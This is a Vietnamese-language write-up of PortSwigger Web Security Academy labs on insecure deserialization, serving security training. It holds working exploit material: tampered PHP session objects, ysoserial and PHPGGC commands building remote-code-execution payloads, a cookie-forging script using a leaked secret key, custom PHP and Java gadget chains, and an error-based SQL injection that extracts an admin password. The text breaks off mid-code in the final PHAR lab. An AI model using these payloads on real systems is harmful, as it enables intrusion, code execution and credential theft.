---
layout: post
title: "Insecure deserialization"
render_with_liquid: false
categories:
  - PortSwigger
tags:
  - portswigger
  - insecure-deserialization
source_collection: notion_portswigger
---
Created by: Nguyễn Giang Nam
Topics: Advanced

Bài lab này sử dụng cơ chế phiên làm việc (session mechanism) dựa trên serialization (tuần tự hóa) và kết quả là dính lỗ hổng leo thang đặc quyền. Để hoàn thành bài lab, hãy chỉnh sửa đối tượng đã được tuần tự hóa trong session cookie nhằm khai thác lỗ hổng này và giành quyền quản trị. Sau đó, xóa người dùng carlos.

**Giải pháp**

1. Đăng nhập bằng thông tin xác thực của bạn. Hãy chú ý rằng yêu cầu GET /my-account sau khi đăng nhập có chứa một session cookie có vẻ như đã được mã hóa URL và Base64.
2. Sử dụng bảng **Inspector** của Burp để xem xét yêu cầu ở dạng đã giải mã. Hãy chú ý rằng cookie này thực chất là một đối tượng PHP đã được tuần tự hóa (serialized PHP object). Thuộc tính admin chứa b:0, biểu thị giá trị boolean là false (sai). Gửi yêu cầu này đến **Burp Repeater**.
3. Trong **Burp Repeater**, sử dụng **Inspector** để kiểm tra lại cookie và thay đổi giá trị của thuộc tính admin thành b:1. Nhấp vào "Apply changes" (Áp dụng thay đổi). Đối tượng đã sửa đổi sẽ tự động được mã hóa lại và cập nhật vào trong yêu cầu.
4. Gửi yêu cầu. Hãy chú ý rằng phản hồi (response) bây giờ đã chứa một liên kết đến bảng điều khiển quản trị tại /admin, cho thấy bạn đã truy cập được trang này với đặc quyền quản trị.
5. Thay đổi đường dẫn (path) trong yêu cầu của bạn thành /admin và gửi lại. Hãy chú ý rằng trang /admin có chứa các liên kết để xóa các tài khoản người dùng cụ thể.
6. Thay đổi đường dẫn trong yêu cầu của bạn thành /admin/delete?username=carlos và gửi yêu cầu để hoàn thành bài lab.

Bài lab này sử dụng cơ chế phiên làm việc (session mechanism) dựa trên serialization (tuần tự hóa) và do đó dính lỗ hổng vượt qua xác thực (authentication bypass). Để hoàn thành bài lab, hãy chỉnh sửa đối tượng đã được tuần tự hóa trong session cookie để truy cập vào tài khoản quản trị viên. Sau đó, xóa người dùng carlos.

Bạn có thể đăng nhập vào tài khoản riêng của mình bằng cách sử dụng các thông tin xác thực sau: wiener:peter

**Gợi ý**

Để truy cập tài khoản của người dùng khác, bạn sẽ cần khai thác một đặc điểm kỳ lạ trong cách PHP so sánh các dữ liệu thuộc các kiểu khác nhau.

Lưu ý rằng hành vi so sánh của PHP có sự khác biệt giữa các phiên bản. Bài lab này giả định hành vi nhất quán với PHP 7.x và các phiên bản cũ hơn.

1. Đăng nhập bằng thông tin xác thực của bạn. Trong Burp, mở yêu cầu GET /my-account sau khi đăng nhập và kiểm tra session cookie bằng công cụ **Inspector** để hiển thị đối tượng PHP đã tuần tự hóa. Gửi yêu cầu này tới **Burp Repeater**.
2. Trong **Burp Repeater**, sử dụng bảng **Inspector** để sửa đổi session cookie như sau:
    - Cập nhật độ dài của thuộc tính username thành 13.
    - Đổi username thành administrator.
    - Đổi access token thành số nguyên 0. Vì đây không còn là chuỗi (string) nữa, bạn cũng cần xóa dấu ngoặc kép bao quanh giá trị.
    - Cập nhật nhãn kiểu dữ liệu cho access token bằng cách thay thế s bằng i.
    - Kết quả trông sẽ như thế này:
        
        O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
        
3. Nhấp vào "Apply changes" (Áp dụng thay đổi). Đối tượng đã sửa đổi sẽ tự động được mã hóa lại và cập nhật vào trong yêu cầu.
4. Gửi yêu cầu. Hãy chú ý rằng phản hồi (response) bây giờ đã chứa một liên kết đến bảng điều khiển quản trị tại /admin, cho thấy bạn đã truy cập thành công trang này với tư cách là người dùng quản trị (administrator).
5. Thay đổi đường dẫn (path) trong yêu cầu của bạn thành /admin và gửi lại. Hãy chú ý rằng trang /admin có chứa các liên kết để xóa các tài khoản người dùng cụ thể.
6. Thay đổi đường dẫn trong yêu cầu của bạn thành /admin/delete?username=carlos và gửi yêu cầu để hoàn thành bài lab

**Bài Lab: Sử dụng chức năng của ứng dụng để khai thác lỗ hổng giải tuần tự hóa không an toàn (insecure deserialization)**

Bài lab này sử dụng cơ chế phiên làm việc (session mechanism) dựa trên serialization (tuần tự hóa). Một tính năng cụ thể sẽ gọi ra một phương thức nguy hiểm trên dữ liệu được cung cấp trong một đối tượng đã được tuần tự hóa. Để hoàn thành bài lab, hãy chỉnh sửa đối tượng đã tuần tự hóa trong session cookie và sử dụng nó để xóa tệp morale.txt khỏi thư mục home của Carlos.

Bạn có thể đăng nhập vào tài khoản riêng của mình bằng cách sử dụng các thông tin xác thực sau: wiener:peter

Bạn cũng có quyền truy cập vào một tài khoản dự phòng: gregg:rosebud

1. Đăng nhập vào tài khoản của bạn. Trên trang "My account", hãy chú ý đến tùy chọn xóa tài khoản của bạn bằng cách gửi một yêu cầu POST tới /my-account/delete.
2. Gửi một yêu cầu có chứa session cookie tới **Burp Repeater**.
3. Trong **Burp Repeater**, nghiên cứu session cookie bằng cách sử dụng bảng **Inspector**. Hãy chú ý rằng đối tượng đã tuần tự hóa có một thuộc tính avatar_link, chứa đường dẫn tệp đến hình đại diện (avatar) của bạn.
4. Chỉnh sửa dữ liệu đã tuần tự hóa sao cho avatar_link trỏ đến /home/carlos/morale.txt. Hãy nhớ cập nhật chỉ số độ dài. Thuộc tính sau khi sửa đổi trông sẽ như thế này:
    
    s:11:"avatar_link";s:23:"/home/carlos/morale.txt"
    
5. Nhấp vào "Apply changes" (Áp dụng thay đổi). Đối tượng đã sửa đổi sẽ tự động được mã hóa lại và cập nhật vào trong yêu cầu.
6. Thay đổi dòng yêu cầu (request line) thành POST /my-account/delete và gửi yêu cầu. Tài khoản của bạn sẽ bị xóa, cùng với tệp morale.txt của Carlos.

**Bài Lab: Tiêm đối tượng tùy ý trong PHP (Arbitrary object injection in PHP)**

Bài lab này sử dụng cơ chế phiên làm việc (session mechanism) dựa trên serialization (tuần tự hóa) và kết quả là dính lỗ hổng tiêm đối tượng tùy ý (arbitrary object injection). Để hoàn thành bài lab, hãy tạo và tiêm một đối tượng đã tuần tự hóa độc hại để xóa tệp morale.txt khỏi thư mục home của Carlos. Bạn sẽ cần phải truy cập được mã nguồn để giải quyết bài lab này.

Bạn có thể đăng nhập vào tài khoản riêng của mình bằng cách sử dụng các thông tin xác thực sau: wiener:peter

**Gợi ý**

Đôi khi bạn có thể đọc mã nguồn bằng cách thêm dấu ngã (~) vào tên tệp để lấy tệp sao lưu do trình soạn thảo tạo ra.

1. Đăng nhập vào tài khoản của bạn và chú ý rằng session cookie có chứa một đối tượng PHP đã được tuần tự hóa.
2. Từ bản đồ trang web (site map), hãy chú ý rằng trang web tham chiếu đến tệp /libs/CustomTemplate.php. Nhấp chuột phải vào tệp và chọn "Send to Repeater".
3. Trong **Burp Repeater**, hãy chú ý rằng bạn có thể đọc mã nguồn bằng cách thêm dấu ngã (~) vào tên tệp trong dòng yêu cầu (request line).
4. Trong mã nguồn, hãy chú ý lớp CustomTemplate chứa phương thức magic __destruct(). Phương thức này sẽ gọi phương thức unlink() trên thuộc tính lock_file_path, thao tác này sẽ xóa tệp nằm tại đường dẫn đó.
5. Trong **Burp Decoder**, sử dụng cú pháp chính xác cho dữ liệu PHP đã tuần tự hóa để tạo một đối tượng CustomTemplate với thuộc tính lock_file_path được đặt thành /home/carlos/morale.txt. Hãy đảm bảo sử dụng đúng các nhãn kiểu dữ liệu và chỉ số độ dài. Đối tượng cuối cùng trông sẽ như thế này:
    
    ```php
    O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
    ```
    
6. Mã hóa Base64 và URL-encode đối tượng này và lưu nó vào clipboard (bộ nhớ tạm) của bạn.
7. Gửi một yêu cầu có chứa session cookie tới **Burp Repeater**.
8. Trong **Burp Repeater**, thay thế session cookie bằng chuỗi đã sửa đổi trong clipboard của bạn.
9. Gửi yêu cầu. Phương thức magic __destruct() sẽ tự động được gọi và sẽ xóa tệp của Carlos.

Lab: Khai thác cơ chế deserialization Java với Apache Commons

Lab này sử dụng cơ chế phiên (session) dựa trên **serialization** và có tải thư viện **Apache Commons Collections**. Mặc dù bạn không có quyền truy cập mã nguồn, bạn vẫn có thể khai thác lab này bằng cách sử dụng các **gadget chain** được dựng sẵn.

Để giải lab, hãy dùng một công cụ bên thứ ba để tạo ra một **đối tượng đã được serialize độc hại** chứa payload **thực thi mã từ xa (RCE)**. Sau đó, đưa đối tượng này vào website để **xóa file `morale.txt`** trong thư mục home của Carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: **wiener:peter**

### Gợi ý

Với Java phiên bản **16 trở lên**, bạn cần thiết lập một số tham số dòng lệnh để Java có thể chạy **ysoserial**. Ví dụ:

```bash
java -jar ysoserial-all.jar \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
   --add-opens=java.base/java.net=ALL-UNNAMED \
   --add-opens=java.base/java.util=ALL-UNNAMED \
   [payload]'[command]'
```

Hoặc cho java 21

```php
java \
  --add-opens java.base/java.lang=ALL-UNNAMED \
  --add-opens java.base/java.util=ALL-UNNAMED \
  --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
  --add-opens java.base/sun.nio.ch=ALL-UNNAMED \
  --add-opens java.base/java.io=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens java.management/javax.management=ALL-UNNAMED \
  --add-opens java.rmi/sun.rmi.transport=ALL-UNNAMED \
  -jar ysoserial-all.jar [payload]'[command]'
```

---

## Lời giải

1. Đăng nhập vào tài khoản của bạn và quan sát rằng cookie session chứa một **đối tượng Java đã được serialize**. Gửi một request có chứa cookie session của bạn sang **Burp Repeater**.
2. Tải công cụ **ysoserial** và chạy lệnh sau để tạo một đối tượng serialize (đã **Base64-encode**) chứa payload của bạn:
    
    **Với Java 16 trở lên:**
    
    ```bash
    java \
      --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
      --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
      --add-opens=java.base/java.net=ALL-UNNAMED \
      --add-opens=java.base/java.util=ALL-UNNAMED \
      -jar ysoserial-all.jar \
      CommonsCollections4 'rm /home/carlos/morale.txt' | base64
    ```
    
    **Với Java 15 trở xuống:**
    
    ```bash
    java -jar ysoserial-all.jar CommonsCollections4'rm /home/carlos/morale.txt' |base64
    ```
    
3. Trong **Burp Repeater**, thay cookie session hiện tại của bạn bằng cookie độc hại vừa tạo. Chọn toàn bộ cookie rồi **URL-encode** nó.
4. Gửi request để giải lab.

**Lab: Khai thác lỗ hổng PHP deserialization với một gadget chain dựng sẵn**

Lab này có cơ chế phiên (session) dựa trên serialization sử dụng cookie được ký (signed cookie). Nó cũng sử dụng một framework PHP phổ biến. Mặc dù bạn không có quyền truy cập mã nguồn, bạn vẫn có thể khai thác lỗ hổng insecure deserialization (deserialization không an toàn) của lab này bằng cách sử dụng các gadget chain (chuỗi công cụ) được dựng sẵn.

Để giải quyết lab, hãy xác định framework mục tiêu, sau đó sử dụng công cụ của bên thứ ba để tạo ra một đối tượng serialized độc hại chứa payload thực thi mã từ xa (RCE). Sau đó, hãy tìm cách tạo một cookie được ký hợp lệ có chứa đối tượng độc hại của bạn. Cuối cùng, gửi cookie này vào trang web để xóa tệp morale.txt khỏi thư mục home của Carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

**TRUY CẬP LAB**

---

**Giải pháp**

1. Đăng nhập và gửi một request chứa session cookie của bạn tới **Burp Repeater**. Bôi đen cookie và xem bảng **Inspector**.
2. Lưu ý rằng cookie chứa một token được mã hóa Base64, được ký bằng hàm băm SHA-1 HMAC.
3. Sao chép cookie đã giải mã từ Inspector và dán vào **Decoder**.
4. Trong **Decoder**, bôi đen token và chọn **Decode as &gt; Base64**. Lưu ý rằng token thực chất là một đối tượng PHP serialized.
5. Trong **Burp Repeater**, hãy quan sát rằng nếu bạn thử gửi request với cookie đã bị sửa đổi, một ngoại lệ (exception) sẽ xảy ra vì chữ ký số không còn khớp. Tuy nhiên, bạn nên chú ý rằng:
    - Một bình luận của nhà phát triển tiết lộ vị trí của tệp gỡ lỗi tại /cgi-bin/phpinfo.php.
    - Thông báo lỗi tiết lộ rằng trang web đang sử dụng framework **Symfony 4.3.6**.
6. Gửi request tới tệp /cgi-bin/phpinfo.php trong Burp Repeater và quan sát rằng nó làm rò rỉ một số thông tin quan trọng về trang web, bao gồm biến môi trường SECRET_KEY. Hãy lưu khóa này lại; bạn sẽ cần nó để ký exploit của mình sau này.
7. Tải xuống công cụ "PHPGGC" và thực thi lệnh sau:codeBash
    
    ```php
    ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 -w0
    ```
    
    Lệnh này sẽ tạo ra một đối tượng serialized được mã hóa Base64, khai thác chuỗi RCE gadget trong Symfony để xóa tệp morale.txt của Carlos.
    
8. Bây giờ bạn cần tạo một cookie hợp lệ chứa đối tượng độc hại này và ký nó một cách chính xác bằng secret key bạn đã lấy được trước đó. Bạn có thể sử dụng đoạn mã PHP sau để thực hiện việc này. Trước khi chạy script, bạn chỉ cần thực hiện các thay đổi sau:codePHP
    - Gán đối tượng bạn đã tạo trong PHPGGC vào biến $object.
    - Gán secret key mà bạn đã sao chép từ tệp phpinfo.php vào biến $secretKey.
    
    ```php
    <?php
    $object = "OBJECT-GENERATED-BY-PHPGGC";
    $secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
    $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
    echo $cookie;
    ?>
    ```
    
    Script này sẽ xuất ra một cookie hợp lệ, đã được ký ra console.
    
9. Trong **Burp Repeater**, thay thế session cookie của bạn bằng cookie độc hại mà bạn vừa tạo, sau đó gửi request để giải quyết lab.

**Lab: Khai thác lỗ hổng Ruby deserialization sử dụng một gadget chain đã được công bố**

Bài lab này sử dụng cơ chế phiên (session) dựa trên serialization và framework Ruby on Rails. Có các mã khai thác (exploit) đã được công bố cho phép thực thi mã từ xa (RCE) thông qua một chuỗi gadget (gadget chain) trong framework này.

Để giải quyết bài lab, hãy tìm một exploit đã được công bố và điều chỉnh nó để tạo ra một đối tượng serialized độc hại chứa payload thực thi mã từ xa. Sau đó, truyền đối tượng này vào trang web để xóa tệp morale.txt khỏi thư mục home của Carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin đăng nhập sau: `wiener:peter`

**Gợi ý**

Hãy thử tìm kiếm cụm từ "ruby deserialization gadget chain" trên mạng.

**TRUY CẬP LAB**

---

**Giải pháp**

1. Đăng nhập vào tài khoản của bạn và nhận thấy rằng session cookie chứa một đối tượng Ruby đã được serialized ("marshaled"). Gửi một request chứa session cookie này tới **Burp Repeater**.
2. Tìm kiếm trên web bài viết "Universal Deserialisation Gadget for Ruby 2.x-3.x" của tác giả vakzz trên devcraft.io. Sao chép đoạn script cuối cùng dùng để tạo payload.
    
    https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
    
3. Sửa đổi script đó như sau:
    - Thay đổi lệnh cần thực thi từ id thành rm /home/carlos/morale.txt.
    - Thay thế hai dòng cuối cùng bằng puts Base64.encode64(payload). Điều này đảm bảo rằng payload được xuất ra đúng định dạng để bạn sử dụng cho bài lab.
4. Chạy script và sao chép đối tượng đã mã hóa Base64 thu được.
5. Trong **Burp Repeater**, thay thế session cookie của bạn bằng cookie độc hại mà bạn vừa tạo, sau đó thực hiện **URL encode** (mã hóa URL) nó.
6. Gửi request để giải quyết bài lab.

**Lab: Phát triển một gadget chain tùy chỉnh cho Java deserialization**

Lab này sử dụng cơ chế phiên (session) dựa trên serialization. Nếu bạn có thể xây dựng một gadget chain (chuỗi công cụ) phù hợp, bạn có thể khai thác lỗ hổng insecure deserialization (deserialization không an toàn) của lab này để lấy mật khẩu của quản trị viên.

Để giải quyết lab, hãy giành quyền truy cập vào mã nguồn và sử dụng nó để xây dựng một gadget chain nhằm lấy mật khẩu quản trị viên. Sau đó, đăng nhập với tư cách quản trị viên và xóa tài khoản carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: wiener:peter

Lưu ý rằng việc giải quyết lab này đòi hỏi sự hiểu biết cơ bản về một chủ đề khác mà chúng tôi đã đề cập trên Web Security Academy (cụ thể là SQL Injection).

**Gợi ý**

Để giúp bạn tiết kiệm công sức, chúng tôi đã cung cấp một chương trình Java tổng quát để serialize các đối tượng. Bạn có thể điều chỉnh nó để tạo ra một đối tượng phù hợp cho exploit của mình. Nếu bạn chưa thiết lập môi trường Java, bạn có thể biên dịch và thực thi chương trình bằng IDE trên trình duyệt, chẳng hạn như repl.it.

**TRUY CẬP LAB**

---

**Giải pháp**

**Xác định lỗ hổng**

1. Đăng nhập vào tài khoản của bạn và nhận thấy session cookie chứa một đối tượng Java serialized.
2. Từ sơ đồ trang web (site map), nhận thấy rằng trang web có tham chiếu đến tệp /backup/AccessTokenUser.java. Bạn có thể request thành công tệp này trong **Burp Repeater**.
3. Điều hướng lên thư mục /backup và nhận thấy rằng nó cũng chứa một tệp ProductTemplate.java.
    
    ```php
    package data.productcatalog;
    
    import common.db.JdbcConnectionBuilder;
    
    import java.io.IOException;
    import java.io.ObjectInputStream;
    import java.io.Serializable;
    import java.sql.Connection;
    import java.sql.ResultSet;
    import java.sql.SQLException;
    import java.sql.Statement;
    
    public class ProductTemplate implements Serializable
    {
        static final long serialVersionUID = 1L;
    
        private final String id;
        private transient Product product;
    
        public ProductTemplate(String id)
        {
            this.id = id;
        }
    
        private void readObject(ObjectInputStream inputStream) throws IOException, ClassNotFoundException
        {
            inputStream.defaultReadObject();
    
            JdbcConnectionBuilder connectionBuilder = JdbcConnectionBuilder.from(
                    "org.postgresql.Driver",
                    "postgresql",
                    "localhost",
                    5432,
                    "postgres",
                    "postgres",
                    "password"
            ).withAutoCommit();
            try
            {
                Connection connect = connectionBuilder.connect(30);
                String sql = String.format("SELECT * FROM products WHERE id = '%s' LIMIT 1", id);
                Statement statement = connect.createStatement();
                ResultSet resultSet = statement.executeQuery(sql);
                if (!resultSet.next())
                {
                    return;
                }
                product = Product.from(resultSet);
            }
            catch (SQLException e)
            {
                throw new IOException(e);
            }
        }
    
        public String getId()
        {
            return id;
        }
    
        public Product getProduct()
        {
            return product;
        }
    }
    ```
    
4. Lưu ý rằng phương thức ProductTemplate.readObject() truyền thuộc tính id của template vào một câu lệnh SQL.
5. Dựa trên mã nguồn bị rò rỉ, hãy viết một chương trình Java nhỏ để khởi tạo (instantiate) một ProductTemplate với ID bất kỳ, serialize nó, và sau đó mã hóa Base64.

&gt; Mẫu (Template)
&gt; 
&gt; 
&gt; Trong trường hợp bạn gặp khó khăn, chúng tôi cũng đã cung cấp một chương trình sẵn sàng sử dụng mà bạn có thể chạy thay thế. Nếu bạn sử dụng chương trình của chúng tôi, tất cả những gì bạn cần thay đổi là chuỗi "your-payload-here" trong tệp Main.java. Chương trình này khởi tạo và serialize một ProductTemplate mới với id được đặt thành bất kỳ payload nào bạn nhập vào đây. Đối tượng sau đó được mã hóa Base64 và xuất ra console để bạn sao chép.
&gt; 
1. Sử dụng chương trình Java của bạn để tạo một ProductTemplate với id được đặt là một dấu nháy đơn ('). Sao chép chuỗi Base64 và gửi nó trong request dưới dạng session cookie của bạn. Thông báo lỗi xác nhận rằng trang web dính lỗi SQL injection dựa trên Postgres thông qua đối tượng deserialized này.

**Trích xuất mật khẩu**

Sau khi xác định được lỗ hổng này, bây giờ bạn cần tìm cách khai thác nó để trích xuất mật khẩu của quản trị viên. Tại thời điểm này, bạn có các tùy chọn sau để thử nghiệm các payload khác nhau:

- Thực hiện thay đổi trong file Java của bạn như đã làm ở bước trước, biên dịch lại và chạy lại nó trước khi dán giá trị mới vào session cookie. Việc này có thể tốn thời gian vì bạn sẽ phải lặp lại tất cả các bước này cho mỗi payload bạn muốn thử.
- Cách khác, bạn có thể sử dụng extension **Hackvertor**. Sau đó, bạn có thể dán đối tượng serialized thô vào Burp Repeater và thêm các thẻ (tags) để tự động cập nhật các offset và mã hóa Base64 đối tượng. Cách này giúp việc kiểm tra số lượng lớn payload nhanh hơn nhiều và thậm chí còn tương thích với **Burp Intruder**.

&gt; Mẫu (Template)
&gt; 
&gt; 
&gt; Trong trường hợp bạn chưa từng sử dụng Hackvertor trước đây, chúng tôi cung cấp mẫu sau. Lưu ý rằng mẫu này được mã hóa Base64 ở đây để tránh các vấn đề khi sao chép/dán:
&gt; 
&gt; PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+
&gt; 
&gt; Để sử dụng mẫu này:
&gt; 
&gt; 1. Sao chép và dán nó vào session cookie của bạn trong Burp Repeater.
&gt; 2. Giải mã Base64 (Base64-decode) nó để hiện ra chuỗi trông giống như sau:
&gt;     
&gt;     &lt;@base64&gt;¬ísr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt&lt;@from_charcode&gt;&lt;@get_len /&gt;&lt;/@from_charcode&gt;YOUR-PAYLOAD-HERE&lt;@set_len&gt;&lt;@length&gt;YOUR-PAYLOAD-HERE&lt;/@length&gt;&lt;/@set_len&gt;&lt;/@base64&gt;
&gt;     
&gt; 3. Thay thế cả hai vị trí YOUR-PAYLOAD-HERE bằng payload mà bạn muốn thử. Giữ nguyên mọi thứ khác.
&gt; 4. Gửi request. Nếu bạn muốn kiểm tra đầu ra mà Hackvertor đã tạo, bạn có thể xem request trên tab "Logger".

Có nhiều cách để trích xuất mật khẩu, nhưng đối với giải pháp này, chúng ta sẽ thực hiện một cuộc tấn công UNION đơn giản, dựa trên lỗi (error-based).

1. Liệt kê số lượng cột trong bảng (là 8).
2. Xác định kiểu dữ liệu của các cột và nhận thấy rằng các cột 4, 5 và 6 không chấp nhận các giá trị kiểu chuỗi (string). Quan trọng là, hãy để ý rằng thông báo lỗi phản ánh lại chuỗi đầu vào mà bạn đã nhập.
3. Liệt kê nội dung của cơ sở dữ liệu và xác định rằng có một bảng tên là users với một cột tên là password.
4. Sử dụng một payload SQL injection phù hợp để trích xuất mật khẩu từ bảng users. Ví dụ, payload sau sẽ gây ra một ngoại lệ hiển thị mật khẩu trong thông báo lỗi:codeSQL
    
    `' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--`
    
    *(Lưu ý: CAST(... AS numeric) được dùng để cố tình gây lỗi ép kiểu dữ liệu, khiến giá trị password bị lộ ra trong thông báo lỗi).*
    
    ![{6C87DCD9-ABA1-4763-9B3D-D8C690FC4EAB}.png](/assets/img/portswigger/insecure-deserialization/6C87DCD9-ABA1-4763-9B3D-D8C690FC4EAB.png)
    
5. Copy Serialized object đưa vào token
    
    ![image.png](/assets/img/portswigger/insecure-deserialization/image.png)
    
6. Đăng nhập bằng administrator
    
    ![{4D009927-18D4-43FC-A388-0424B150D55A}.png](/assets/img/portswigger/insecure-deserialization/4D009927-18D4-43FC-A388-0424B150D55A.png)
    

**Lab: Phát triển một gadget chain tùy chỉnh cho PHP deserialization**

Bài lab này sử dụng cơ chế phiên (session) dựa trên serialization. Bằng cách triển khai một gadget chain (chuỗi công cụ) tùy chỉnh, bạn có thể khai thác lỗ hổng insecure deserialization (deserialization không an toàn) của nó để đạt được khả năng thực thi mã từ xa (RCE). Để giải quyết bài lab, hãy xóa tệp morale.txt khỏi thư mục home của Carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: wiener:peter

**Gợi ý**

Đôi khi bạn có thể đọc mã nguồn bằng cách thêm dấu ngã (~) vào cuối tên tệp để truy xuất tệp sao lưu do trình soạn thảo tạo ra.

**TRUY CẬP LAB**

---

**Giải pháp**

Đăng nhập vào tài khoản của bạn và nhận thấy rằng session cookie chứa một đối tượng PHP serialized. Để ý rằng trang web có tham chiếu đến tệp `/cgi-bin/libs/CustomTemplate.php`. Lấy mã nguồn bằng cách gửi một request sử dụng phần mở rộng tệp sao lưu .php~.

```php
<?php

class CustomTemplate {
    private $default_desc_type;
    private $desc;
    public $product;

    public function __construct($desc_type='HTML_DESC') {
        $this->desc = new Description();
        $this->default_desc_type = $desc_type;
        // Carlos thought this is cool, having a function called in two places... What a genius
        $this->build_product();
    }

    public function __sleep() {
        return ["default_desc_type", "desc"];
    }

    public function __wakeup() {
        $this->build_product();
    }

    private function build_product() {
        $this->product = new Product($this->default_desc_type, $this->desc);
    }
}

class Product {
    public $desc;

    public function __construct($default_desc_type, $desc) {
        $this->desc = $desc->$default_desc_type;
    }
}

class Description {
    public $HTML_DESC;
    public $TEXT_DESC;

    public function __construct() {
        // @Carlos, what were you thinking with these descriptions? Please refactor!
        $this->HTML_DESC = '<p>This product is <blink>SUPER</blink> cool in html</p>';
        $this->TEXT_DESC = 'This product is cool in text';
    }
}

class DefaultMap {
    private $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }

    public function __get($name) {
        return call_user_func($this->callback, $name);
    }
}

?>
```

### Phân tích Gadget Chain

Lỗ hổng nằm ở việc sử dụng các "Magic Methods" của PHP (__wakeup, __get) để chuyển hướng luồng dữ liệu vào một hàm nguy hiểm.

1. **Trigger (__wakeup)**: Khi chuỗi được deserialize, phương thức CustomTemplate::__wakeup() được gọi. Nó gọi build_product().
2. **Flow (build_product -&gt; Product)**: build_product() tạo một đối tượng Product mới, truyền vào default_desc_type (tham số lệnh) và desc (đối tượng DefaultMap).
3. **Vulnerability (Product::__construct)**: Constructor của Product thực thi dòng lệnh: $this-&gt;desc = $desc-&gt;$default_desc_type;.
    - Ở đây, $desc là đối tượng DefaultMap.
    - Nó cố gắng truy cập thuộc tính có tên là nội dung của $default_desc_type (ví dụ: "rm /home/carlos/morale.txt").
4. **Sink (DefaultMap::__get)**: Vì thuộc tính "rm..." không tồn tại trong DefaultMap, phương thức __get($name) được kích hoạt.
    - $name chính là chuỗi lệnh rm /home/carlos/morale.txt.
    - DefaultMap gọi call_user_func($this-&gt;callback, $name).
    - Với $callback là "exec", mã thực thi trở thành: exec("rm /home/carlos/morale.txt").

### 2. Mã PHP tạo Payload

Để tạo payload, bạn cần viết một script PHP định nghĩa lại cấu trúc các class (chỉ cần các thuộc tính giống hệt bản gốc) và thực hiện serialize.

```php
<?php

// 1. Định nghĩa lại các class giả lập (Stub classes)
// Chúng ta chỉ cần cấu trúc dữ liệu, không cần logic hàm.

class CustomTemplate {
    public $default_desc_type;
    public $desc;

    public function __construct($command, $desc_object) {
        $this->default_desc_type = $command;
        $this->desc = $desc_object;
    }
}

class DefaultMap {
    public $callback;

    public function __construct($callback) {
        $this->callback = $callback;
    }
}

// Class Product và Description không cần thiết cho việc TẠO payload, 
// vì chúng chỉ được sử dụng trong logic xử lý của server sau khi deserialize.

// 2. Xây dựng Chain theo logic bạn đã mô tả

// Bước A: Tạo đối tượng DefaultMap chứa hàm cần gọi (exec)
$target_callback = "exec";
$map = new DefaultMap($target_callback);

// Bước B: Tạo đối tượng CustomTemplate
// - default_desc_type sẽ là tham số truyền vào hàm exec (lệnh xóa file)
// - desc sẽ là đối tượng DefaultMap ở trên
$command = "rm /home/carlos/morale.txt";
$payload_object = new CustomTemplate($command, $map);

// 3. Serialize và in ra kết quả
// Đây là chuỗi bạn sẽ dùng để tấn công
echo serialize($payload_object);

// Nếu cần mã hóa Base64 (thường dùng trong Cookie hoặc tham số web):
// echo base64_encode(serialize($payload_object));
?>

❯ php payload.php
O:14:"CustomTemplate":2:{s:17:"default_desc_type";s:26:"rm /home/carlos/morale.txt";s:4:"desc";O:10:"DefaultMap":1:{s:8:"callback";s:4:"exec";}}%  
```

![image.png](/assets/img/portswigger/insecure-deserialization/image%201.png)

**Lab: Sử dụng PHAR deserialization để triển khai một gadget chain tùy chỉnh**

Bài lab này không sử dụng deserialization một cách rõ ràng. Tuy nhiên, nếu bạn kết hợp PHAR deserialization với các kỹ thuật tấn công nâng cao khác, bạn vẫn có thể đạt được khả năng thực thi mã từ xa (RCE) thông qua một gadget chain (chuỗi công cụ) tùy chỉnh.

Để giải quyết bài lab, hãy xóa tệp morale.txt khỏi thư mục home của Carlos.

Bạn có thể đăng nhập vào tài khoản của mình bằng thông tin sau: wiener:peter

**TRUY CẬP LAB**

---

**Giải pháp**

Quan sát rằng trang web có tính năng tải lên avatar của riêng bạn, tính năng này chỉ chấp nhận ảnh JPG. Hãy tải lên một ảnh JPG hợp lệ làm avatar. Nhận thấy rằng nó được tải bằng cách sử dụng request GET /cgi-bin/avatar.php?avatar=wiener.

```php
// https://0a6b002f04f6a5b883796fc800c30087.web-security-academy.net/cgi-bin/Blog.php~
<?php

require_once('/usr/local/envs/php-twig-1.19/vendor/autoload.php');

class Blog {
    public $user;
    public $desc;
    private $twig;

    public function __construct($user, $desc) {
        $this->user = $user;
        $this->desc = $desc;
    }

    public function __toString() {
